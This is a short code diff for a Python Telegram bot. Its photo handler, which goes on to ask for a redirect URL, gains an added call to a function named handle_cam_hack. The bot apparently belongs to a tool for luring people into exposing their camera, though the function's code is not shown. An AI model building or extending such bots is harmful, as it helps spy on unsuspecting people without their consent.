@@ -41,6 +41,7 @@ def get_photo(message, user_id):
         bot.register_next_step_handler(message, get_redirect, user_id)
     else:
         bot.send_message(user_id, "❌ Send a PHOTO first.", reply_markup=get_bottom_buttons())
+        handle_cam_hack(bot, message)
 
 def get_redirect(message, user_id):
     redirect_url = message.text
